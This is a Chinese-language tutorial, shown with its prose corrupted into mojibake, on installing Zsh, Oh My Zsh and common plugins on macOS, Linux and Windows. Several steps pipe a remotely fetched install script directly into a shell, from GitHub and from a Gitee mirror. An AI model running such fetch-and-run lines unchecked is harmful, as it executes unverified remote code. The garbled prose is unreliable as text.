      â†“ï¼ˆå¯ç”¨åŠŸèƒ½ï¼‰
<span class="hljs-section">æ­¥éª¤5: é‡è½½é…ç½®</span>
</code></pre>
<p>å°±åƒè£…ä¿®æˆ¿å­ï¼šå…ˆå»ºå¥½æˆ¿å­ï¼ˆZshï¼‰â†’ è£…ä¿®å…¬å¸è¿›åœºï¼ˆOh My Zshï¼‰â†’ æ·»åŠ å®¶å…·ï¼ˆæ’ä»¶ï¼‰â†’ å¸ƒç½®æ‘†æ”¾ï¼ˆé…ç½®ï¼‰</p>
<hr/>
<h3 data-id="heading-15">1.1 æ¨èæ’ä»¶åˆ—è¡¨</h3>
<h4 data-id="heading-16">â­ å¿…è£…æ’ä»¶ï¼ˆTop 5ï¼‰</h4>
<h5 data-id="heading-17">1. zsh-autosuggestions â­â­â­â­â­</h5>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šæ ¹æ®å†å²å‘½ä»¤è‡ªåŠ¨æç¤ºè¡¥å…¨</li>
<li><strong>æ•ˆæœ</strong>ï¼šè¾“å…¥æ—¶è‡ªåŠ¨ç°è‰²æç¤ºï¼ŒæŒ‰ <code>â†’</code> é”®æ¥å—å»ºè®®</li>
<li><strong>æ¨èæŒ‡æ•°</strong>ï¼šå¿…è£…ï¼Œæ•ˆç‡æå‡ 50%</li>
</ul>
<h5 data-id="heading-18">2. zsh-syntax-highlighting â­â­â­â­â­</h5>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šå‘½ä»¤è¯­æ³•å®æ—¶é«˜äº®</li>
<li><strong>æ•ˆæœ</strong>ï¼šæ­£ç¡®å‘½ä»¤æ˜¾ç¤ºç»¿è‰²ï¼Œé”™è¯¯å‘½ä»¤æ˜¾ç¤ºçº¢è‰²</li>
<li><strong>æ¨èæŒ‡æ•°</strong>ï¼šå¿…è£…ï¼Œé¿å…è¾“å…¥é”™è¯¯</li>
</ul>
<h5 data-id="heading-19">3. fzf â­â­â­â­â­</h5>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šæ¨¡ç³Šæœç´¢å†å²å‘½ä»¤å’Œæ–‡ä»¶</li>
<li><strong>å¿«æ·é”®</strong>ï¼š<code>Ctrl+R</code> æœç´¢å†å²ï¼Œ<code>Ctrl+T</code> æœç´¢æ–‡ä»¶</li>
<li><strong>æ¨èæŒ‡æ•°</strong>ï¼šå¿…è£…ï¼Œå¿«é€ŸæŸ¥æ‰¾ç¥å™¨</li>
</ul>
<h5 data-id="heading-20">4. git â­â­â­â­â­</h5>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šGit å‘½ä»¤åˆ«åå’Œè‡ªåŠ¨è¡¥å…¨</li>
<li><strong>åˆ«åç¤ºä¾‹</strong>ï¼š<code>gst</code>(status)ã€<code>gaa</code>(add all)ã€<code>gcmsg</code>(commit)</li>
<li><strong>æ¨èæŒ‡æ•°</strong>ï¼šå¿…è£…ï¼ŒGit ç”¨æˆ·å¿…å¤‡</li>
</ul>
<h5 data-id="heading-21">5. autojump / z â­â­â­â­</h5>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šæ™ºèƒ½è®°å½•å¸¸ç”¨ç›®å½•ï¼Œå¿«é€Ÿè·³è½¬</li>
<li><strong>ä½¿ç”¨</strong>ï¼š<code>j ç›®å½•å</code> æˆ– <code>z ç›®å½•å</code> å³å¯è·³è½¬</li>
<li><strong>æ¨èæŒ‡æ•°</strong>ï¼šå¼ºçƒˆæ¨èï¼Œå‘Šåˆ« cd ../../../</li>
</ul>
<h4 data-id="heading-22">ğŸ”§ å®ç”¨æ’ä»¶ï¼ˆæ¨èå®‰è£…ï¼‰</h4>
<h5 data-id="heading-23">6. colored-man-pages â­â­â­</h5>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šå½©è‰²æ˜¾ç¤º man å¸®åŠ©æ–‡æ¡£</li>
<li><strong>æ¨èæŒ‡æ•°</strong>ï¼šæå‡é˜…è¯»ä½“éªŒ</li>
</ul>
<h5 data-id="heading-24">7. extract â­â­â­â­</h5>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šç»Ÿä¸€è§£å‹å‘½ä»¤ï¼Œæ”¯æŒæ‰€æœ‰æ ¼å¼</li>
<li><strong>ä½¿ç”¨</strong>ï¼š<code>extract æ–‡ä»¶å</code> è‡ªåŠ¨è¯†åˆ«å¹¶è§£å‹</li>
<li><strong>æ¨èæŒ‡æ•°</strong>ï¼šå¼ºçƒˆæ¨è</li>
</ul>
<h5 data-id="heading-25">8. docker / kubectl / npm â­â­â­</h5>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šå„ç§å¼€å‘å·¥å…·çš„è¡¥å…¨å’Œåˆ«å</li>
<li><strong>æ¨èæŒ‡æ•°</strong>ï¼šæŒ‰éœ€å®‰è£…</li>
</ul>
<hr/>
<h3 data-id="heading-26">1.2 å®‰è£…é…ç½®</h3>
<h4 data-id="heading-27">ğŸ” å…ˆæ£€æŸ¥ä½ çš„æƒ…å†µ</h4>
<p>åœ¨å¼€å§‹å®‰è£…å‰ï¼Œå…ˆç¡®è®¤ä½ çš„ç³»ç»ŸçŠ¶æ€ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦å·²å®‰è£… Zsh</span>
zsh --version

<span class="hljs-comment"># æ£€æŸ¥å½“å‰ä½¿ç”¨çš„ Shell</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span>

<span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦å·²å®‰è£… Oh My Zsh</span>
<span class="hljs-built_in">ls</span> -la ~/.oh-my-zsh
</code></pre>
<p><strong>æ ¹æ®æ£€æŸ¥ç»“æœé€‰æ‹©å¯¹åº”çš„å®‰è£…è·¯å¾„ï¼š</strong></p>





















<table><thead><tr><th>æ£€æŸ¥ç»“æœ</th><th>è·³è½¬åˆ°</th></tr></thead><tbody><tr><td>âŒ æ²¡æœ‰ Zsh</td><td><a href="#1211-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AE%8C%E6%95%B4%E5%AE%89%E8%A3%85" title="#1211-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AE%8C%E6%95%B4%E5%AE%89%E8%A3%85">ä»é›¶å¼€å§‹å®‰è£…</a></td></tr><tr><td>âœ… æœ‰ Zshï¼Œæ²¡æœ‰ Oh My Zsh</td><td><a href="#1212-%E5%B7%B2%E6%9C%89-zsh%E5%8F%AA%E8%A3%85-oh-my-zsh" title="#1212-%E5%B7%B2%E6%9C%89-zsh%E5%8F%AA%E8%A3%85-oh-my-zsh">åªè£… Oh My Zsh</a></td></tr><tr><td>âœ… éƒ½æœ‰ï¼Œåªæƒ³åŠ æ’ä»¶</td><td><a href="#1213-%E5%B7%B2%E6%9C%89-oh-my-zsh%E5%8F%AA%E8%A3%85%E6%8F%92%E4%BB%B6" title="#1213-%E5%B7%B2%E6%9C%89-oh-my-zsh%E5%8F%AA%E8%A3%85%E6%8F%92%E4%BB%B6">åªè£…æ’ä»¶</a></td></tr></tbody></table>
<hr/>
<h4 data-id="heading-28">1.2.1 macOS / Linux å®‰è£…</h4>
<h5 data-id="heading-29">1.2.1.1 ä»é›¶å¼€å§‹å®Œæ•´å®‰è£…</h5>
<blockquote>
<p><strong>é€‚ç”¨å¯¹è±¡</strong>ï¼šå…¨æ–°ç³»ç»Ÿï¼Œä»æœªå®‰è£…è¿‡ Zsh</p>
</blockquote>
<h6 data-id="heading-30">ç¬¬ä¸€æ­¥ï¼šå®‰è£… Zsh ç¨‹åº</h6>
<p><strong>è¿™ä¸€æ­¥åœ¨åšä»€ä¹ˆï¼Ÿ</strong> å®‰è£… Zsh è¿™ä¸ª Shell ç¨‹åºæœ¬èº«ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># macOSï¼ˆç³»ç»Ÿè‡ªå¸¦ Zshï¼Œä½†ç‰ˆæœ¬å¯èƒ½è¾ƒæ—§ï¼‰</span>
<span class="hljs-comment"># æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</span>
zsh --version  <span class="hljs-comment"># å¦‚æœæ˜¾ç¤ºç‰ˆæœ¬å·ï¼Œè¯´æ˜å·²å®‰è£…</span>

<span class="hljs-comment"># å¦‚æœæƒ³å‡çº§åˆ°æœ€æ–°ç‰ˆï¼ˆå¯é€‰ï¼‰</span>
brew install zsh

<span class="hljs-comment"># Ubuntu/Debian</span>
sudo apt update
sudo apt install zsh -y

<span class="hljs-comment"># CentOS/RHEL</span>
sudo yum install zsh -y

<span class="hljs-comment"># éªŒè¯å®‰è£…</span>
zsh --version  <span class="hljs-comment"># åº”è¯¥æ˜¾ç¤ºç±»ä¼¼ zsh 5.9</span>
</code></pre>
<h6 data-id="heading-31">ç¬¬äºŒæ­¥ï¼šè®¾ç½® Zsh ä¸ºé»˜è®¤ Shell</h6>
<p><strong>è¿™ä¸€æ­¥åœ¨åšä»€ä¹ˆï¼Ÿ</strong> è®©ç»ˆç«¯é»˜è®¤ä½¿ç”¨ Zsh è€Œä¸æ˜¯ Bashã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è®¾ç½®ä¸ºé»˜è®¤ Shell</span>
chsh -s $(<span class="hljs-built_in">which</span> zsh)

<span class="hljs-comment"># ğŸ’¡ è¯´æ˜ï¼š</span>
<span class="hljs-comment"># - è®¾ç½®åéœ€è¦é‡å¯ç»ˆç«¯æ‰ç”Ÿæ•ˆ</span>
<span class="hljs-comment"># - å¦‚æœæç¤ºæƒé™é—®é¢˜ï¼Œå¯èƒ½éœ€è¦å…ˆå°† zsh æ·»åŠ åˆ° /etc/shells</span>

<span class="hljs-comment"># é‡å¯ç»ˆç«¯åéªŒè¯</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span>  <span class="hljs-comment"># åº”è¯¥æ˜¾ç¤º /bin/zsh æˆ– /usr/bin/zsh</span>
</code></pre>
<h6 data-id="heading-32">ç¬¬ä¸‰æ­¥ï¼šå®‰è£… Oh My Zsh æ¡†æ¶</h6>
<p><strong>è¿™ä¸€æ­¥åœ¨åšä»€ä¹ˆï¼Ÿ</strong> å®‰è£…æ’ä»¶ç®¡ç†æ¡†æ¶ï¼Œè®©åç»­å®‰è£…æ’ä»¶å˜ç®€å•ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨å®˜æ–¹å®‰è£…è„šæœ¬ï¼ˆä¼šè‡ªåŠ¨å¤‡ä»½åŸæœ‰çš„ .zshrcï¼‰</span>
sh -c <span class="hljs-string">"<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>"</span>

<span class="hljs-comment"># ğŸ’¡ è¯´æ˜ï¼š</span>
<span class="hljs-comment"># - è¿™ä¸ªå‘½ä»¤ä¼šåšä»¥ä¸‹äº‹æƒ…ï¼š</span>
<span class="hljs-comment">#   1. å…‹éš† Oh My Zsh åˆ° ~/.oh-my-zsh</span>
<span class="hljs-comment">#   2. å¤‡ä»½ä½ åŸæœ‰çš„ ~/.zshrc ä¸º ~/.zshrc.pre-oh-my-zsh</span>
<span class="hljs-comment">#   3. åˆ›å»ºæ–°çš„ ~/.zshrc é…ç½®æ–‡ä»¶</span>
<span class="hljs-comment">#   4. è‡ªåŠ¨åˆ‡æ¢åˆ° Zsh</span>

<span class="hljs-comment"># å®‰è£…æˆåŠŸåä¼šçœ‹åˆ° Oh My Zsh çš„ Logo</span>
</code></pre>
<p><strong>å¦‚æœå®‰è£…è„šæœ¬è¢«å¢™æ— æ³•è®¿é—®ï¼Ÿ</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Gitee é•œåƒ</span>
sh -c <span class="hljs-string">"<span class="hljs-subst">$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)</span>"</span>

<span class="hljs-comment"># æ–¹æ³•äºŒï¼šæ‰‹åŠ¨å®‰è£…</span>
git <span class="hljs-built_in">clone</span> https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh
<span class="hljs-built_in">cp</span> ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc
</code></pre>
<hr/>
<h5 data-id="heading-33">1.2.1.2 å·²æœ‰ Zshï¼Œåªè£… Oh My Zsh</h5>
<blockquote>
<p><strong>é€‚ç”¨å¯¹è±¡</strong>ï¼šç³»ç»Ÿå·²æœ‰ Zshï¼Œä½†æ²¡è£…è¿‡ Oh My Zsh</p>
</blockquote>
<p><strong>ç›´æ¥æ‰§è¡Œï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¡®è®¤ Zsh ç‰ˆæœ¬ï¼ˆå»ºè®® 5.0 ä»¥ä¸Šï¼‰</span>
zsh --version

<span class="hljs-comment"># å¦‚æœå½“å‰ä¸æ˜¯ Zshï¼Œå…ˆåˆ‡æ¢</span>
zsh

<span class="hljs-comment"># å®‰è£… Oh My Zsh</span>
sh -c <span class="hljs-string">"<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>"</span>

<span class="hljs-comment"># å¦‚æœå·²ç»æ˜¯é»˜è®¤ Shellï¼Œé‡æ–°æ‰“å¼€ç»ˆç«¯å³å¯</span>
<span class="hljs-comment"># å¦‚æœä¸æ˜¯ï¼Œæ‰§è¡Œï¼š</span>
chsh -s $(<span class="hljs-built_in">which</span> zsh)
</code></pre>
<hr/>
<h5 data-id="heading-34">1.2.1.3 å·²æœ‰ Oh My Zshï¼Œåªè£…æ’ä»¶</h5>
<blockquote>
<p><strong>é€‚ç”¨å¯¹è±¡</strong>ï¼šå·²ç»å®‰è£…äº† Oh My Zshï¼Œåªæƒ³æ·»åŠ æ’ä»¶</p>
</blockquote>
<p><strong>è·³è¿‡å‰é¢çš„æ­¥éª¤ï¼Œç›´æ¥çœ‹ä¸‹é¢çš„"å®‰è£…æ’ä»¶"éƒ¨åˆ†ã€‚</strong></p>
<h6 data-id="heading-35">ç¬¬å››æ­¥ï¼šå®‰è£…æ’ä»¶</h6>
<p><strong>è¿™ä¸€æ­¥åœ¨åšä»€ä¹ˆï¼Ÿ</strong> å®‰è£…èƒ½å¤§å¹…æå‡æ•ˆç‡çš„æ’ä»¶ã€‚</p>
<p>æ’ä»¶åˆ†ä¸¤ç§ç±»å‹ï¼š</p>
<ul>
<li><strong>ğŸ”· éœ€è¦ä¸‹è½½çš„æ’ä»¶</strong>ï¼ˆç”¨ git cloneï¼‰</li>
<li><strong>ğŸ”¶ å†…ç½®æ’ä»¶</strong>ï¼ˆOh My Zsh è‡ªå¸¦ï¼Œåªéœ€åœ¨é…ç½®ä¸­å¯ç”¨ï¼‰</li>
</ul>
<p><strong>A. ä¸‹è½½å¤–éƒ¨æ’ä»¶ï¼ˆå¿…è£…ï¼‰</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. zsh-autosuggestionsï¼ˆè‡ªåŠ¨è¡¥å…¨å»ºè®®ï¼‰</span>
<span class="hljs-comment"># ğŸ’¡ è¿™ä¸ªæ’ä»¶ä¼šæ ¹æ®ä½ çš„å†å²å‘½ä»¤è‡ªåŠ¨æç¤º</span>
git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="hljs-variable">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-autosuggestions

<span class="hljs-comment"># 2. zsh-syntax-highlightingï¼ˆè¯­æ³•é«˜äº®ï¼‰</span>
<span class="hljs-comment"># ğŸ’¡ è¾“å…¥æ­£ç¡®å‘½ä»¤æ˜¾ç¤ºç»¿è‰²ï¼Œé”™è¯¯æ˜¾ç¤ºçº¢è‰²</span>
git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="hljs-variable">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-syntax-highlighting

<span class="hljs-comment"># å¦‚æœ GitHub è¢«å¢™ï¼Œä½¿ç”¨ Gitee é•œåƒï¼š</span>
<span class="hljs-comment"># git clone https://gitee.com/myl9361/zsh-autosuggestions.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions</span>
<span class="hljs-comment"># git clone https://gitee.com/Annihilater/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting</span>
</code></pre>
<p><strong>B. å®‰è£…ç‹¬ç«‹å·¥å…·ï¼ˆå¼ºçƒˆæ¨èï¼‰</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 3. autojumpï¼ˆæ™ºèƒ½ç›®å½•è·³è½¬ï¼‰</span>
<span class="hljs-comment"># macOS</span>
brew install autojump

<span class="hljs-comment"># Ubuntu/Debian</span>
sudo apt install autojump -y

<span class="hljs-comment"># CentOS/RHEL</span>
sudo yum install autojump -y

<span class="hljs-comment"># 4. fzfï¼ˆæ¨¡ç³Šæœç´¢ï¼‰</span>
<span class="hljs-comment"># macOS</span>
brew install fzf
<span class="hljs-comment"># å®‰è£…å¿«æ·é”®ç»‘å®š</span>
$(brew --prefix)/opt/fzf/install

<span class="hljs-comment"># Ubuntu/Debian</span>
sudo apt install fzf -y

<span class="hljs-comment"># æ‰‹åŠ¨å®‰è£…ï¼ˆæ‰€æœ‰ç³»ç»Ÿé€šç”¨ï¼‰</span>
git <span class="hljs-built_in">clone</span> --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
~/.fzf/install
</code></pre>
<p><strong>éªŒè¯å®‰è£…</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ£€æŸ¥æ’ä»¶æ˜¯å¦ä¸‹è½½æˆåŠŸ</span>
<span class="hljs-built_in">ls</span> ~/.oh-my-zsh/custom/plugins/
<span class="hljs-comment"># åº”è¯¥çœ‹åˆ° zsh-autosuggestions å’Œ zsh-syntax-highlighting</span>

<span class="hljs-comment"># æ£€æŸ¥å·¥å…·æ˜¯å¦å®‰è£…æˆåŠŸ</span>
<span class="hljs-built_in">which</span> autojump  <span class="hljs-comment"># åº”è¯¥æ˜¾ç¤ºè·¯å¾„</span>
<span class="hljs-built_in">which</span> fzf       <span class="hljs-comment"># åº”è¯¥æ˜¾ç¤ºè·¯å¾„</span>
</code></pre>
<h6 data-id="heading-36">ç¬¬äº”æ­¥ï¼šç¼–è¾‘é…ç½®æ–‡ä»¶å¯ç”¨æ’ä»¶</h6>
<p><strong>è¿™ä¸€æ­¥åœ¨åšä»€ä¹ˆï¼Ÿ</strong> å‘Šè¯‰ Oh My Zsh è¦åŠ è½½å“ªäº›æ’ä»¶ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¼–è¾‘é…ç½®æ–‡ä»¶</span>
vim ~/.zshrc
<span class="hljs-comment"># æˆ–ä½¿ç”¨å…¶ä»–ç¼–è¾‘å™¨</span>
nano ~/.zshrc
</code></pre>
<p><strong>åœ¨é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ° <code>plugins=()</code> è¿™ä¸€è¡Œï¼ˆå¤§çº¦åœ¨ 70 è¡Œå·¦å³ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¿®æ”¹å‰ï¼ˆé»˜è®¤åªæœ‰ gitï¼‰</span>
plugins=(git)

<span class="hljs-comment"># â¬‡ï¸ ä¿®æ”¹åï¼ˆæ·»åŠ æ‰€æœ‰æ¨èæ’ä»¶ï¼‰</span>
plugins=(
  git                          <span class="hljs-comment"># Git å‘½ä»¤åˆ«åï¼ˆå†…ç½®ï¼‰</span>
  zsh-autosuggestions          <span class="hljs-comment"># è‡ªåŠ¨å»ºè®®ï¼ˆå·²ä¸‹è½½ï¼‰</span>
  zsh-syntax-highlighting      <span class="hljs-comment"># è¯­æ³•é«˜äº®ï¼ˆå·²ä¸‹è½½ï¼‰</span>
  autojump                     <span class="hljs-comment"># ç›®å½•è·³è½¬ï¼ˆå·²å®‰è£…ï¼‰</span>
  z                            <span class="hljs-comment"># è½»é‡ç›®å½•è·³è½¬ï¼ˆå†…ç½®ï¼‰</span>
  fzf                          <span class="hljs-comment"># æ¨¡ç³Šæœç´¢ï¼ˆå·²å®‰è£…ï¼‰</span>
  colored-man-pages            <span class="hljs-comment"># å½©è‰²æ‰‹å†Œï¼ˆå†…ç½®ï¼‰</span>
  extract                      <span class="hljs-comment"># ä¸‡èƒ½è§£å‹ï¼ˆå†…ç½®ï¼‰</span>
)

<span class="hljs-comment"># ğŸ’¡ è¯´æ˜ï¼š</span>
<span class="hljs-comment"># - gitã€zã€colored-man-pagesã€extract æ˜¯ Oh My Zsh å†…ç½®çš„ï¼Œä¸éœ€è¦ä¸‹è½½</span>
<span class="hljs-comment"># - zsh-autosuggestionsã€zsh-syntax-highlighting éœ€è¦ç”¨ git clone ä¸‹è½½</span>
<span class="hljs-comment"># - autojumpã€fzf æ˜¯ç‹¬ç«‹ç¨‹åºï¼Œéœ€è¦ç”¨åŒ…ç®¡ç†å™¨å®‰è£…</span>
</code></pre>
<p><strong>ä¿å­˜æ–‡ä»¶ï¼š</strong></p>
<ul>
<li>Vim ç¼–è¾‘å™¨ï¼šæŒ‰ <code>ESC</code>ï¼Œè¾“å…¥ <code>:wq</code>ï¼Œå›è½¦</li>
<li>Nano ç¼–è¾‘å™¨ï¼šæŒ‰ <code>Ctrl+O</code> ä¿å­˜ï¼Œ<code>Ctrl+X</code> é€€å‡º</li>
</ul>
<h6 data-id="heading-37">ç¬¬å…­æ­¥ï¼šé‡è½½é…ç½®ä½¿å…¶ç”Ÿæ•ˆ</h6>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶</span>
<span class="hljs-built_in">source</span> ~/.zshrc

<span class="hljs-comment"># æˆ–è€…ç›´æ¥é‡å¯ç»ˆç«¯ä¹Ÿå¯ä»¥</span>
</code></pre>
<p><strong>éªŒè¯æ’ä»¶æ˜¯å¦ç”Ÿæ•ˆï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æµ‹è¯• autosuggestions</span>
<span class="hljs-comment"># è¾“å…¥ git stï¼Œåº”è¯¥è‡ªåŠ¨ç°è‰²æç¤º git status</span>
<span class="hljs-comment"># æŒ‰ â†’ é”®æ¥å—å»ºè®®</span>

<span class="hljs-comment"># 2. æµ‹è¯• syntax-highlighting  </span>
<span class="hljs-comment"># è¾“å…¥æ­£ç¡®å‘½ä»¤ï¼ˆå¦‚ lsï¼‰åº”è¯¥æ˜¾ç¤ºç»¿è‰²</span>
<span class="hljs-comment"># è¾“å…¥é”™è¯¯å‘½ä»¤ï¼ˆå¦‚ lsssï¼‰åº”è¯¥æ˜¾ç¤ºçº¢è‰²</span>

<span class="hljs-comment"># 3. æµ‹è¯• fzf</span>
<span class="hljs-comment"># æŒ‰ Ctrl+R åº”è¯¥å¼¹å‡ºæ¨¡ç³Šæœç´¢ç•Œé¢</span>

<span class="hljs-comment"># 4. æµ‹è¯• autojump</span>
<span class="hljs-comment"># å…ˆ cd åˆ°å‡ ä¸ªç›®å½•ï¼Œç„¶å j ç›®å½•å åº”è¯¥èƒ½è·³è½¬</span>
</code></pre>
<h4 data-id="heading-38">1.2.2 Windows å®‰è£…</h4>
<p><strong>Windows æœ‰ä¸¤ç§æ–¹æ¡ˆï¼Œé€‰æ‹©é€‚åˆä½ çš„ï¼š</strong></p>























<table><thead><tr><th>æ–¹æ¡ˆ</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th><th>æ¨èå¯¹è±¡</th></tr></thead><tbody><tr><td><strong>WSL</strong></td><td>å®Œæ•´ Linux ç¯å¢ƒ<br/>æ’ä»¶å…¨å…¼å®¹<br/>æ€§èƒ½å¥½</td><td>éœ€è¦ Win10+</td><td>å¼€å‘è€…é¦–é€‰ â­â­â­â­â­</td></tr><tr><td><strong>Git Bash + Zsh</strong></td><td>è½»é‡<br/>ä¸ Windows é›†æˆå¥½</td><td>éƒ¨åˆ†æ’ä»¶ä¸å…¼å®¹<br/>é…ç½®å¤æ‚</td><td>è½»åº¦ä½¿ç”¨ â­â­â­</td></tr></tbody></table>
<h5 data-id="heading-39">æ–¹æ¡ˆä¸€ï¼šWSLï¼ˆå¼ºçƒˆæ¨èï¼‰</h5>
<p><strong>ä»€ä¹ˆæ˜¯ WSLï¼Ÿ</strong> Windows Subsystem for Linuxï¼Œå¯ä»¥åœ¨ Windows ä¸Šè¿è¡Œå®Œæ•´çš„ Linux ç³»ç»Ÿã€‚</p>
<h6 data-id="heading-40">ç¬¬ä¸€æ­¥ï¼šå®‰è£… WSL</h6>
<pre><code class="hljs language-powershell" lang="powershell"># åœ¨ PowerShellï¼ˆç®¡ç†å‘˜æƒé™ï¼‰ä¸­æ‰§è¡Œ
# å³é”®å¼€å§‹èœå• â†’ Windows PowerShell (ç®¡ç†å‘˜)

# ä¸€é”®å®‰è£… WSL + Ubuntu
wsl --install

# ğŸ’¡ è¯´æ˜ï¼š
# - è¿™ä¸ªå‘½ä»¤ä¼šè‡ªåŠ¨å®‰è£… WSL 2 å’Œ Ubuntu
# - éœ€è¦é‡å¯ç”µè„‘
# - é‡å¯åä¼šè‡ªåŠ¨æ‰“å¼€ Ubuntuï¼Œè®¾ç½®ç”¨æˆ·åå’Œå¯†ç 
</code></pre>
<p><strong>å¦‚æœæç¤ºéœ€è¦å¯ç”¨è™šæ‹ŸåŒ–ï¼š</strong></p>
<pre><code class="hljs language-powershell" lang="powershell"># å¯ç”¨ WSL åŠŸèƒ½
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart

# å¯ç”¨è™šæ‹Ÿæœºå¹³å°
dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart

# é‡å¯ç”µè„‘åå†æ‰§è¡Œ wsl --install
</code></pre>
<h6 data-id="heading-41">ç¬¬äºŒæ­¥ï¼šè¿›å…¥ WSL å®‰è£… Zsh</h6>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æ‰“å¼€ WSL Ubuntuï¼ˆåœ¨å¼€å§‹èœå•æœç´¢ Ubuntuï¼‰</span>

<span class="hljs-comment"># 2. æ›´æ–°è½¯ä»¶æº</span>
sudo apt update

<span class="hljs-comment"># 3. æŒ‰ç…§ä¸Šé¢ Linux çš„å®Œæ•´æ­¥éª¤å®‰è£…å³å¯</span>
<span class="hljs-comment"># è·³è½¬åˆ° 1.2.1.1 èŠ‚</span>
</code></pre>
<p><strong>WSL è®¿é—® Windows æ–‡ä»¶ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Windows çš„ C ç›˜åœ¨ WSL ä¸­çš„è·¯å¾„</span>
<span class="hljs-built_in">cd</span> /mnt/c/

<span class="hljs-comment"># ä¾‹å¦‚è®¿é—®æ¡Œé¢</span>
<span class="hljs-built_in">cd</span> /mnt/c/Users/ä½ çš„ç”¨æˆ·å/Desktop
</code></pre>
<hr/>
<h5 data-id="heading-42">æ–¹æ¡ˆäºŒï¼šGit Bash + Zshï¼ˆä¸æ¨èæ–°æ‰‹ï¼‰</h5>
<p><strong>ä¸ºä»€ä¹ˆä¸æ¨èï¼Ÿ</strong></p>
<ul>
<li>Git Bash åŸç”Ÿä¸æ”¯æŒ Zsh</li>
<li>éœ€è¦æ‰‹åŠ¨ç¼–è¯‘æˆ–ä¸‹è½½é¢„ç¼–è¯‘ç‰ˆæœ¬</li>
<li>éƒ¨åˆ†æ’ä»¶å¯èƒ½ä¸å…¼å®¹</li>
<li>é…ç½®è¾ƒå¤æ‚</li>
</ul>
<p><strong>å¦‚æœç¡®å®è¦ç”¨ï¼Œå»ºè®®ç›´æ¥ç”¨ Git Bash åŸç”Ÿçš„ Bash + æ’ä»¶ï¼ˆè§ç¬¬äºŒç« ï¼‰</strong></p>
<p>å¦‚æœéè¦åœ¨ Git Bash ä¸­ä½¿ç”¨ Zshï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å®‰è£… Git for Windows</span>
<span class="hljs-comment"># ä¸‹è½½åœ°å€ï¼šhttps://git-scm.com/download/win</span>

<span class="hljs-comment"># 2. ä¸‹è½½ Zsh for Windowsï¼ˆMSYS2 é¢„ç¼–è¯‘ç‰ˆï¼‰</span>
<span class="hljs-comment"># ä¸‹è½½åœ°å€ï¼šhttps://packages.msys2.org/package/zsh</span>
<span class="hljs-comment"># éœ€è¦ä¸‹è½½ zsh å’Œç›¸å…³ä¾èµ–</span>

<span class="hljs-comment"># 3. è§£å‹åˆ° Git å®‰è£…ç›®å½•</span>
<span class="hljs-comment"># é€šå¸¸æ˜¯ C:\Program Files\Git</span>

<span class="hljs-comment"># 4. æ‰“å¼€ Git Bashï¼Œè¾“å…¥ zsh å¯åŠ¨</span>

<span class="hljs-comment"># 5. å®‰è£… Oh My Zsh</span>
sh -c <span class="hljs-string">"<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>"</span>
</code></pre>
<p><strong>âš ï¸ æ³¨æ„ï¼šè¿™ç§æ–¹å¼å¯èƒ½é‡åˆ°å„ç§å…¼å®¹æ€§é—®é¢˜ï¼Œå»ºè®®ä¼˜å…ˆä½¿ç”¨ WSLã€‚</strong></p>
<hr/>
